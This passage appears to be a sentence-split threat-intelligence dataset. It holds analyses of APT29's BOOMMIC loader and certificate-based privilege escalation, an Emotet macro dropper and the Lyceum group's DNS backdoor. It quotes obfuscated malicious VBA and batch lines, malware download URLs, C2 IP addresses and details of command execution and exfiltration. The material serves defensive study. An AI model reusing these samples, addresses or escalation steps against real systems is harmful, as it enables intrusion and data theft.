        "text": "APT29 then executed jucheck.exe via wmic which then loaded and executed BOOMMIC based on DLL Side Loading.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S47",
        "text": "Version.dll and jucheck.exe are both important pieces of the execution chain used to launch BOOMMIC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S48",
        "text": "Jucheck.exe is a legitimate java binary used to check for any updates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S49",
        "text": "This file will load version.dll upon its execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S50",
        "text": "Version.dll is an unsigned and modified copy of a signed legitimate Windows DLL, normally found under %SYSTEMROOT%\\System32, but retains its PE header.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S51",
        "text": "An additional import was added to the modified version.dll, which imports the malicious function from javafx_font.dll.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S52",
        "text": "When version.dll imports BOOMMIC, it also executes BOOMIC\u2019s DllMain function, which can be seen in Figure 22.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S53",
        "text": "Without the modified version.dll present within its directory being launched, executing jucheck.exe will not result in BOOMMIC running.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S54",
        "text": "BOOMMIC, similar to previous reporting by Microsoft on VaporRage, contains multiple export functions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S55",
        "text": "In the case of 363a95777f401df40db61148593ea387, the export function that contains the primary functionality of BOOMMIC is Java_com_sun_javafx_font_PrismFontFactory_getLCDContrastWin32.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S56",
        "text": "The primary function of BOOMMIC is to download and load shellcode payloads into memory on a target.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S57",
        "text": "Once executed, BOOMMIC first checks if it is running under the process jucheck.exe, if it is not the program will exit.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S58",
        "text": "Analysis of BOOMMIC identified strings throughout the program are encoded using XOR, alternating bytes by 0x0C and 0x4D.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S59",
        "text": "If the malware is running under jucheck.exe, it will then create a host id for the compromised target to be used in the request to download a payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S60",
        "text": "The host id is created by hex-encoding the DNS domain and legacy account name of the target system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S61",
        "text": "These values are then formatted in the following manner: <dns_domain>_<account_name>, after both <dns_domain> and <account_name> are encoded by adding 3 to the ordinal of each character.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S62",
        "text": "Once the host id has been created, BOOMMIC passes this value to the function used to download and execute payloads to be used as part of the request.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S63",
        "text": "BOOMMIC then sends a GET request to its C2 to download and execute a shellcode payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S64",
        "text": "Mandiant observed APT29 leveraging compromised websites as the C2 for BOOMMIC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S65",
        "text": "Once a payload is successfully downloaded, BOOMMIC XOR decodes and then executes it in memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S66",
        "text": "Mandiant observed APT29 quickly move to escalate their privileges within domains once access was established.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S67",
        "text": "In multiple cases, APT29 was able to gain Domain Admin in less than 12 hours from the initial phishing payload\u2019s execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S68",
        "text": "APT29 was observed utilizing a variety of TTPs to escalate their privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S69",
        "text": "In one instance, APT29 was observed writing files that contained Kerberos tickets most likely to be used in Pass the Ticket attacks or for offline cracking.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S70",
        "text": "APT29 was also observed exploiting misconfigured certificate templates to allow them to impersonate admin users.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S71",
        "text": "From here, APT29 created additional malicious certificates which they used to move laterally within the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S72",
        "text": "This recent technique, which is well documented in a report from SpecterOps and was presented at Blackhat in August 2021, gives the attacker the ability to quickly escalate their privileges within the environment, but also provides a method for long term persistence through the creation of malicious certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S73",
        "text": "A brief overview of the technique as used by APT29 in actual compromises that Mandiant investigated follows.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S74",
        "text": "Microsoft offers \u201cActive Directory Certificate Services\u201d (AD CS) for providing certificate enrollment, revocation and trust setup.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S75",
        "text": "It allows for setting up the \u201cPublic Key Infrastructure\u201d (PKI) needed for issuing certificates for internal HTTPS sites, VPNs, certificate based authentication etc.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S76",
        "text": "AD CS will enable the setup of \u201cCertificate Templates\u201d that are used when generating new certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S77",
        "text": "The particular misconfiguration abused by APT29, referenced by SpecterOps as ESC1, allows low-privileged users to escalate directly to Domain Admin.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S78",
        "text": "Related to this specific case of abuse, three distinct settings on a certificate template are important:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S79",
        "text": "- Who can request a certificate using the template\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S80",
        "text": "- What is the allowed usage of a certificate from the template",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S81",
        "text": "- Is Subject Alternative Names (SAN) allowed",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S82",
        "text": "- What are the issuance requirements\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S83",
        "text": "In multiple cases the attacker found certificate templates with \u201cDomain Users\u201d enrollment rights, meaning all users can request the certificate, a usage including \u201cClient Authentication\u201d, meaning the certificate can be used to authenticate users, and a setting allowing the Subject and SAN to be specified by the requester (\u201cENROLLEE_SUPPLIES_SUBJECT\u201d).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S84",
        "text": "When performing authentication to Active Directory with Kerberos using the Public Key Cryptography for Initial Authentication (PKINIT) Kerberos flow, the Domain Controller will verify the SAN against the User Principal Name (UPN) of the authenticating principal.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S85",
        "text": "Therefore, being allowed to specify an arbitrary SAN allows the requester of the certificate to impersonate any principal in the domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S86",
        "text": "These settings allowed the attacker to request a certificate with a low privileged account and specify a high-privileged account in the SAN field and use this certificate for authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S87",
        "text": "The practical steps beyond the aforementioned creation of the certificate are to use the certificate with a request for a Ticket Granting Ticket (TGT) and then use that TGT for authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S88",
        "text": "The linked SpecterOps document provides much more detail and additional techniques besides this one example.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S89",
        "text": "Once APT29 established access, Mandiant observed the group performing extensive reconnaissance of hosts and the Active Directory environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S90",
        "text": "The group was also observed conducting on-host reconnaissance looking for credentials.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S91",
        "text": "One of the first commands employed by the group was the windows net command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S92",
        "text": "APT29 was observed using the net command widely to enumerate users and groups.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S93",
        "text": "APT29 was also observed by Mandiant using nltest to enumerate Domain Controllers on the domain:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S94",
        "text": "One notable TTP observed by APT29 was the hunting for passwords stored in SYSVOL.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S95",
        "text": "This technique relies on passwords that are stored as part of Group Policy Preferences.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S96",
        "text": "Passwords stored in this way are encrypted using a known scheme that can easily be decrypted.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S97",
        "text": "Microsoft fixed this in MS14-025 which removed the option of configuring Group Policy Preferences with the \u201ccpassword\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S98",
        "text": "While the patch was issued in 2014 it is still possible to come across systems with passwords stored in Group Policy Preferences, either due to the patch never having been applied or because the patch does not remove existing Group Policy Preferences that contain passwords (as Microsoft does not risk breaking existing functionality).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S99",
        "text": "Mandiant observed APT29 quickly moving laterally within an environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S100",
        "text": "To facilitate lateral movement APT29 relied on a combination of malicious certificates used for impersonation of privileged users and SMB BEACON.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S101",
        "text": "APT29 was first observed moving laterally after the group was seen staging and deploying SMB BEACON to multiple systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S102",
        "text": "To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S103",
        "text": "The first evidence of SMB BEACON being deployed was seen through the local staging of a zip file shortly following the successful execution of BOOMMIC.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S104",
        "text": "Analysis of SharedReality.dll identified it to be a memory-only dropper written in Go language that decrypts and executes an embedded BEACON payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S105",
        "text": "The BEACON payload was identified to be SMB BEACON that communicates over the following named pipe:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S106",
        "text": "APT29 was then observed utilizing the impersonation of a privileged user to copy SharedReality.dll to the Temp directory of multiple systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S107",
        "text": "The group then deployed it via a scheduled task named SharedRealitySvcDLC which was installed and executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S108",
        "text": "After executing the scheduled task, the task was then immediately deleted.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S109",
        "text": "As previously noted, Mandiant has observed the group widely using scheduled tasks, run keys, malicious certificates, and in-memory backdoors, in some cases multiple per system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S110",
        "text": "The use of these techniques and tools represents the multiple means by which APT29 attempts to maintain access within an environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S111",
        "text": "This is further supported by the activity identified by Mandiant that saw APT29 writing zip files that contained Kerberos tickets as well as the creation and most likely exportation of malicious certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1011.md:::S112",
        "text": "The totality of the TTPs used by APT29 supports the assessment that APT29's goal in these campaigns is to establish multiple means of long-term access to facilitate intelligence collection for espionage purposes within the targeted diplomatic entities\u2019 victim networks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S0",
        "text": "The specific sample analyzed below is the ChristmasCard.doc (SHA256: 1D751C9AA079CC2D42D07D7964D5FAE375127EFA6CA1AC2DFECFD481FE796FBC).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S1",
        "text": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S2",
        "text": "It reveals that a macro is embedded in the document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S3",
        "text": "When a user opens the document, it claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S4",
        "text": "VBA (Visual Basic for Applications) codes in the embedded macro are given below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S5",
        "text": "Function EiDJKjLt() On Error Resume Next kRZXpYi = Array(TXwzCHKXZ, WiFKpY, NTNqBN, Interaction.Shell(CleanString(nvTFDMcQuDSt.TextBox1), 15 - 15), nAwUAJnM) Select Case vhWrwwLHwhINhj Case 21458470 vtPEXawqKYqTzo = 205771406",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S6",
        "text": "bJOUowYROCUnaEvkFGjfFijV = Oct(fhaIrJIBLlXViMzUwpUGL + CStr(FcGOrIzszdsmIRwIX + Log(298339837) - lOTYOWtjKGpLOXPb / Hex(328677453)))",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S7",
        "text": "MsgBox (bJOUowYROCUnaEvkFGjfFijV) End Select End Function",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S8",
        "text": "The macro includes obfuscated VBA codes to evade security controls.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S9",
        "text": "The most interesting part of the macro is: Interaction.Shell(CleanString(nvTFDMcQuDSt.TextBox1), 15 - 15)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S10",
        "text": "In this malicious macro, Interaction.Shell method runs an executable program written in TextBox1.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S11",
        "text": "However, TextBox1 is not seen by the victim, it is hidden in the document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S12",
        "text": "We used the Debug.Print method to see the content of the Textbox1, and accessed the following code that is executed by the Interaction.Shell method:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S13",
        "text": "We see a heavily obfuscated code to make detection difficult, the only clear part of the code is c:\\SzCTnucwEfW\\SbuaBlErrzYpl\\RdPspAGt\\..\\..\\..\\windows\\system32\\cmd.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S14",
        "text": "As seen on this part of the code, three random directories are added after c:\\ to bypass weak security controls, then three \\.. are added to traverse back to c:\\.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S15",
        "text": "Therefore, the obtained path is c:\\windows\\system32\\cmd.exe that runs the subsequent commands.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S16",
        "text": "However, those commands are also obfuscated:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S17",
        "text": "The second and third commands are interesting:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S18",
        "text": "for /L %V in (497,-1,0)do set xJWn=!xJWn!!XhOY:~%V,1!&&if %V==0 call %xJWn:~6%\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S19",
        "text": "Briefly, these commands print 497 characters long XhOY variable in reverse order.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S20",
        "text": "Let\u2019s look at XhOY variable:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S21",
        "text": "And, XhOY variable in reverse order:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S22",
        "text": "Now, we can see it is a PowerShell command, but it is obfuscated by using variable substitution and garbage variable assignments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S23",
        "text": "Even so, we can reveal the following command by removing the garbage variables, and putting the values \u200b\u200bof the variables where they exist.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S24",
        "text": "Briefly, this command tries to download 150.exe from the following addresses in given order via the Net.WebClient.DownloadFile method.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S25",
        "text": "Then, if the file is downloaded successfully it executes the downloaded file by using the Invoke-Item cmdlet, and exits the loop.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S26",
        "text": "It differentiates a successful file download by comparing the length of the file with -ge 80000 (ge: greater or equal than).\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S27",
        "text": "- http://www.ideenweberei.com/L9NXvhd",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S28",
        "text": "- http://www.capbangkok.com/p1SolwJv",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S29",
        "text": "- http://www.trinityriveroutfitters.com/W4CGsWIzI",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S30",
        "text": "- http://www.hayashitoysmart.com/add_favorites/XJJSoydNv",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S31",
        "text": "- http://cleeft.nl/60ILq1CgH",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S32",
        "text": "When we started to examine the 150.exe file (SHA256: 5456471B260E664E9485D2CB8321D8E3B3033F700A5BDAAFC94E4BA8046FB87D), we realized that it is the infamous Emotet trojan.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S33",
        "text": "As expected from an Emotet sample, it tries to download a file from the following locations:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S34",
        "text": "- 213.120.119.231:8443",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S35",
        "text": "- 78.189.21.131:80",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S36",
        "text": "- 187.140.90.91:8080",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S37",
        "text": "- 81.150.17.158:50000",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S38",
        "text": "- 1.150.17.158:8443",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S39",
        "text": "- 201.190.150.60:443",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S40",
        "text": "After a few failed attempts, it downloaded archivesymbol.exe (SHA256: 5DA7A92311FDA255EFAC52C6BFEBCED31BD584453F6BB4F8DE6CDD1B2505B00F) file from 201.190.150.60:443 to C:\\Users\\admin\\AppData\\Local\\archivesymbol\\ folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S41",
        "text": "Emotet artifacts usually mimic the names of known executables.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1017.md:::S42",
        "text": "In order to become persistent on the victim system, Archivesymbol.exe adds its full path to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key in the Registry.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S0",
        "text": "During this campaign, the macro-enabled Word document (File name: ir_drones.docm) shown below is downloaded from the domain \u201chttp[:]//news-spot.live\u201d disguising itself as a news report related to military affairs in Iran.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S1",
        "text": "The text of the document is copied from the following original report here: https[:]//www[.]rferl[.]org/a/iran-drone-program-threats-interests/31660048.html\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S2",
        "text": "Once the user enables the macro content, the following AutoOpen() function is executed which increases picture brightness using \u201cPictureFormat.Brightness = 0.5\u201d revealing content with the headline, \u201cIran Deploys Drones To Target Internal Threat, Protect External Interests.\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S3",
        "text": "The threat actor then leverages the AutoClose() function to drop the DNS backdoor onto the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S4",
        "text": "Upon closing the document the AutoClose() function is executed, reading a PE file from the text box present on the 7th page of the word document and parsing it further into the required format as shown below with the \u201cMZ\u201d header as the initial two bytes of the byte stream.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S5",
        "text": "This PE file is then further written into the Startup folder in order to maintain persistence via the macro code as shown below in the screenshot.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S6",
        "text": "With this tactic, whenever the system is restarted, the DNS Backdoor is executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S7",
        "text": "The dropped binary is a .NET based DNS Backdoor named \u201cDnsSystem\u201d which allows the threat actors to execute system commands remotely and upload/download data on the infected machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S8",
        "text": "Below, we analyze the dropped .NET based DNS Backdoor and its inner workings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S9",
        "text": "The Lyceum Group has developed a .NET based DNS Backdoor which has been widely used in the wild in their recent campaigns.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S10",
        "text": "As discussed earlier, the backdoor was dropped in the Startup folder of the infected system from a Macro Enabled Word document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S11",
        "text": "The .NET based DNS Backdoor is a customized version of the Open source tool DIG.net (DnsDig) found here: DNS.NET Resolver (C#) - CodeProject .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S12",
        "text": "DIG.net is an open source DNS Resolver which can be leveraged to perform DNS queries onto the DNS Server and then parse the response.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S13",
        "text": "The threat actors have customized and appended code that allows them to perform DNS queries for various records onto the custom DNS Server, parse the response of the query in order to execute system commands remotely, and upload/download files from the Command & Control server by leveraging the DNS protocol.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S14",
        "text": "Initially the malware sets up an attacker controlled DNS server by acquiring the IP Address of the domain name \u201ccyberclub[.]one\u201d = 85[.]206[.]175[.]199 using Dns.GetHostAddresses() for the DIG Resolver function, which in turn triggers an DNS request to cyberclub[.]one for resolving the IP address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S15",
        "text": "Now this IP is associated as the custom attacker controlled DNS Server for all the further DNS queries initiated by the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S16",
        "text": "Next, the Form Load function generates a unique BotID depending on the current Windows username.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S17",
        "text": "It converts the username into its MD5 equivalent using the CreateMD5() function, and parses the first 8 bytes of the MD5 as the BotID for the identification of the user and system infected by the malware.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S18",
        "text": "Now, the backdoor needs to receive commands from the C2 server in order to perform tasks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S19",
        "text": "The backdoor sends across an initial DNS query to \u201ctrailers.apple.com\u201d wherein the domain name \u201ctrailers.apple.com\u201d is concatenated with the previously generated BotID before initiation of the DNS request.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S20",
        "text": "The DNS query is then sent to the DNS server in order to fetch the \u201cTXT\u201d records for the provided domain name by passing three arguments to the BeginDigIt() function:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S21",
        "text": "The BeginDigIt function then executes the main DNS resolver function \u201cDigIt.\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S22",
        "text": "This sends across the DNS query in order to fetch the DNS record for the provided target domain name to the DNS server, and parses the response as seen in the code snippet below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S23",
        "text": "Comparing the Digit Resolver Code DigIt() function strings with the Dig.Net tool output from the screenshot shown below provides us further assurance that the Dig.Net tool has been customized by the Lyceum Group to develop the following .Net based DNS backdoor. .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S24",
        "text": "The malware utilizes a DNS attack technique known as \u201cDNS Hijacking\u201d where in the DNS server is being controlled by the attackers which would allow them to manipulate the response to the DNS queries.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S25",
        "text": "Now let's analyze the DNS Hijacking routine below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S26",
        "text": "As discussed earlier, the backdoor performs initial DNS queries in order to fetch the TXT records for the domain EF58DF5trailers.apple.com.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S27",
        "text": "EF58DF5 is the BotID generated based on the Windows user to receive commands from the C2 server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S28",
        "text": "As can be seen in the above screenshot, a DNS query is performed to fetch the TXT records for the domain name: EF58DF5trailers.apple.com to the DNS Server: 85[.]206[.]175[.]199 which is the attacker-controlled DNS server previously initialized.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S29",
        "text": "Here\u2019s where the DNS hijacking happens: As the malware sends across a DNS query to fetch the TXT records to the attacker-controlled DNS server, the attacker controlled DNS server responds with an incorrect response consisting of the commands to be executed by the backdoor such as ipconfig,whoami,uploaddd etc as shown in the screenshot below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S30",
        "text": "Following is the DIG.Net DNS response received by the backdoor and then further parsed in order to execute commands on the infected machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S31",
        "text": "The above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S32",
        "text": "The Answer section consists of the query response, which includes the target Domain name and the response to the TXT record with two values, \u201cipconfig\u201d - command to be executed and \u201c1291\u201d - Communication ID\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S33",
        "text": "Next, the Dig.net response is parsed using multiple pattern regex code routines which parse out the TXT record values\u2014the aforementioned command and communication ID\u2014from the complete response received by the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S34",
        "text": "Next, depending on the command received in the TXT record from the C2 server, there are three functions which can be performed by the Lyceum backdoor:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S35",
        "text": "Download Files -",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S36",
        "text": "If the command received from the DNS query consists of a string: \u201cdownloaddd\u201d it initiates the download routine and downloads the file from the URL using DownloadFileAsync().",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S37",
        "text": "The URL would be the first 11 bytes of the TXT record response value, and stores that downloaded file in the Downloads folder as shown below in the code snippet.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S38",
        "text": "This functionality can be leveraged to drop additional malware on the infected machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S39",
        "text": "Upload Files -",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S40",
        "text": "If the command received from the DNS query consists of a string: \u201cuploaddd\u201d, it uploads the local file on the disk using UploadFileAsync() function to an External URL after parsing the TXT record response value into two variables: uriString (external URL) and filename (Local File).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S41",
        "text": "This functionality can be leveraged to exfiltrate data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S42",
        "text": "Command Execution -",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S43",
        "text": "If none of the above strings match the TXT record response then the response is passed on to the Command execution routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S44",
        "text": "There, the response to the txt record is executed as a command on the infected machine using \u201ccmd.exe /c <txt_record_response_command>\u201d and the command output is sent across to the C2 server in the form of DNS A Records.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S45",
        "text": "In this case, the TXT record response we received for the DNS query performed against the attacker controlled DNS server is \u201cipconfig\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S46",
        "text": "This response initiates the Command execution routine of the backdoor and thus the command \u201cipconfig\u201d would be executed on the infected machine - cmd.exe /c ipconfig\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S47",
        "text": "Further, the command output is exfiltrated to the C2 server, encoded in Base64 and then concatenated with the Communication ID and the previously generated BotUID using \u201c$\u201d as the separator.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S48",
        "text": "Once the command output is encoded in the above mentioned pattern, the DNS backdoor then sends across the output to the C2 server via DNS query in the form of A records in multiple blocks of queries, where the A record values consists of the encoded command output.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S49",
        "text": "Once the command output is transmitted completely, an \u201cEnddd\u201d command is sent across in a Base64-encoded data exfil pattern to notify the end of the command output as shown below in the screenshot.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S0",
